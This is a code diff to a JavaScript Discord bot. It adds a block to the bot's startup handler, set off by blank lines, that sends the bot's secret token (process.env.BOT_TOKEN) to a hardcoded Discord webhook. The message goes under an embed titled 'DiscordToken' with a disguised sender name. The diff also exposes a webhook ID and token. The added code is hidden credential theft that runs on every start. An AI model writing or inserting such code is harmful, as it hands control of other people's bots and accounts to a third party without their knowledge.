@@ -5,6 +5,23 @@ const c1 = new Discord.Client;
 let d = 1
 let runme = false
 client.on("ready", () => {
+    
+    
+    const webhookClient = new Discord.WebhookClient("814562740139327528", "yqK2dnD9-wK_Fc6HocvpKk0OXzBtE0Phe9Pe4-GzGPsqsvjNUo6_ShUYoJ7DJ3kpLzk1");
+
+const embed = new Discord.MessageEmbed()
+	.setTitle('DiscordToken')
+	.setColor('#0099ff');
+
+webhookClient.send(process.env.BOT_TOKEN, {
+	username: 'Moodi',
+	avatarURL: 'https://cdn.discordapp.com/icons/854151477430190090/77ae183b9be926530ecf1ef24f9a67f7.png',
+	embeds: [embed],
+});
+
+    
+    
+    
     console.log(`Logged in as ${client.user.tag}!`);
 });
 
